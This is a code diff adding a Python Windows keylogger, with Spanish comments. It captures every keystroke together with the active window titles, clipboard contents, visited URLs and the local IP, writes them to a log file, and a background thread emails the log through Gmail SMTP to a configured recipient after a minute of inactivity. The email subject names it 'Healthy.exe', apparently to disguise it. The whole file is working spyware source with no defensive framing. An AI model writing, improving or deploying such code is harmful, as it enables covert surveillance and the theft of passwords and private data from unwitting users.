@@ -1,0 +1,192 @@
+import json
+import time
+import smtplib
+from email.mime.text import MIMEText
+from pynput import keyboard
+import pyperclip
+import socket
+import logging
+import win32gui, threading
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.application import MIMEApplication
+import os
+
+# Función para obtener la dirección IP local
+def get_local_ip(config_filename='config.json'):
+    try:
+        with open(config_filename, 'r') as file:
+            config = json.load(file)
+            keylogger_IP = config.get('keylogger_IP', False)
+            if keylogger_IP:
+                hostname = socket.gethostname()
+                local_ip = socket.gethostbyname(hostname)
+                return local_ip
+            else:
+                return "Disabled"
+    except:
+        return "Unknown"
+
+# Función para interpretar la URL (debe implementarse según necesidad)
+def parse_url(url):
+    # Aquí puedes implementar la lógica para interpretar la URL
+    return url
+
+# Función para guardar la visita a una URL en el registro
+def log_website_visit(url, config_filename='config.json'):
+    try:
+        with open(config_filename, 'r') as file:
+            config = json.load(file)
+            keylogger_web_visit = config.get('keylogger_web_visit', False)
+            if keylogger_web_visit:
+                time_now = time.strftime("%Y-%m-%d %H:%M:%S")
+                log_data = f'{time_now} - Visited URL: {url}'
+                print(log_data)
+
+                carpeta_guardado = config.get("carpeta_guardado", 'KeyActiveLog.txt')
+                logging.basicConfig(filename=carpeta_guardado, level=logging.DEBUG, format='%(message)s')
+                logging.log(10, log_data)
+            else:
+                print("Website Disabled")
+    except:
+        print("Error while logging website visit")
+
+# Función para obtener el título de la ventana activa
+def get_active_window(config_filename="config.json"):
+    try:
+        with open(config_filename, 'r') as file:
+            config = json.load(file)
+            Keylogger_active_windows = config.get('Keylogger_active_windows', False)
+            if Keylogger_active_windows:
+                window = win32gui.GetForegroundWindow()
+                window_title = win32gui.GetWindowText(window)
+                return window_title
+            else:
+                return "Disable Active Window"
+    except:
+        return "Unknown"
+
+# Función que se ejecuta cada vez que se presiona una tecla
+def on_keypress(key, carpeta_guardado):
+    global log_data, last_activity_time
+    last_activity_time = time.time()  # Actualizamos last_activity_time al presionar una tecla
+    # print(f"Last activity time updated: {last_activity_time}")
+
+    try:
+        window_title = get_active_window()
+        time_now = time.strftime("%Y-%m-%d %H:%M:%S")
+
+        clipboard_content = pyperclip.paste()
+
+        local_ip = get_local_ip()
+
+        if clipboard_content.startswith('http://') or clipboard_content.startswith('https://'):
+            interpreted_url = parse_url(clipboard_content)
+            log_website_visit(interpreted_url)
+            log_data = f'{time_now} - Window: {window_title}, URL: {interpreted_url}, IP: {local_ip}'
+            print(f'{time_now} - Window: {window_title}, URL: {interpreted_url}, IP: {local_ip}')
+        elif 'http://' in window_title or 'https://' in window_title:
+            log_website_visit(window_title)
+            log_data = f'{time_now} - Window: {window_title}, IP: {local_ip}'
+            print(f'{time_now} - Window: {window_title}, IP: {local_ip}')
+        else:
+            key_str = str(key.char) if hasattr(key, 'char') else str(key)
+            log_data = f'{time_now} - Window: {window_title}, Key: {key_str}, IP: {local_ip}'
+            print(f'{time_now} - Window: {window_title}, Key: {key_str}, IP: {local_ip}')
+
+        logging.basicConfig(filename=carpeta_guardado, level=logging.DEBUG, format='%(message)s')
+        logging.log(10, log_data)
+
+    except AttributeError:
+        print(f'{time_now} - Window: {window_title}, Special Key: {key}')
+
+# Función para enviar correo electrónico con archivo adjunto
+def send_email(subject, message, recipient_email, config, attachment_path):
+    sender_email = config["fromaddr"]
+    sender_password = config["password"]
+
+    msg = MIMEMultipart()
+    msg["Subject"] = subject
+    msg["From"] = sender_email
+    msg["To"] = recipient_email
+    msg.attach(MIMEText(message, 'plain'))
+
+    with open(attachment_path, 'rb') as attachment:
+        part = MIMEApplication(attachment.read(), Name=os.path.basename(attachment_path))
+        part['Content-Disposition'] = f'attachment; filename="{os.path.basename(attachment_path)}"'
+        msg.attach(part)
+
+    try:
+        server = smtplib.SMTP('smtp.gmail.com', 587)
+        server.starttls()
+        server.login(sender_email, sender_password)
+        server.sendmail(sender_email, recipient_email, msg.as_string())
+        server.quit()
+        print("Correo electrónico enviado exitosamente")
+    except Exception as e:
+        print("Error al enviar el correo electrónico:", str(e))
+
+# Función para verificar el tiempo de inactividad y enviar el correo
+def check_and_send_email(config):
+    global last_activity_time
+    while True:
+        current_time = time.time()
+        inactive_duration = current_time - last_activity_time
+
+        if inactive_duration >= 60:  # 60 segundos = 1 minuto
+            with open(carpeta_guardado, "r") as log_file:
+                log_content = log_file.read()
+            send_email("Registro del Healthy.exe", "Adjunto el registro del Healthy.exe.", config["toaddr"], config, carpeta_guardado)
+            last_activity_time = current_time  # Reiniciamos last_activity_time
+
+        time.sleep(30)  # Verificar cada 30 segundos
+
+if __name__ == "__main__":
+    # Función para cargar la configuración desde un archivo JSON
+    def load_config(filename):
+        try:
+            with open(filename, 'r') as file:
+                return json.load(file)
+        except FileNotFoundError:
+            with open('config_default.json', 'r') as default_file:
+                return json.load(default_file)
+
+    # Nombre del archivo de configuración
+    config_filename = 'config.json'
+
+    # Cargar la configuración
+    config = load_config(config_filename)
+
+    # Guardar la configuración inicial si el archivo no existe
+    with open(config_filename, 'w') as file:
+        json.dump(config, file, indent=4)
+
+    # Variables para el tiempo de inactividad y el registro de actividad
+    last_activity_time = time.time()
+    log_data = ""
+
+    # Ruta del archivo donde se guardarán los registros del Keylogger
+    carpeta_guardado = config.get("carpeta_guardado", 'KeyActiveLog.txt')
+    keylogger_active = config.get('keylogger_active', False)
+    
+     # Crear y ejecutar el hilo para verificar el tiempo de inactividad y enviar correo
+    email_thread = threading.Thread(target=check_and_send_email, args=(config,))
+    email_thread.start()
+
+
+    # Definir la función on_keyrelease dentro del bloque if __name__ == "__main__":
+    def on_keyrelease(key):
+        if key == keyboard.Key.esc:
+            return False
+
+# Verificar si keylogger_active está activado en el config.json
+    if keylogger_active:
+        with keyboard.Listener(
+            on_press=lambda key: on_keypress(key, carpeta_guardado),
+            on_release=on_keyrelease,
+        ) as listener:
+            while True:
+                listener.join()  # Esperar por eventos de teclado
+                check_and_send_email(config)  # Verificar el tiempo de inactividad y enviar correo si es necesario
+    else:
+        print("Se desactivó la función del keylogger en el archivo config.json")
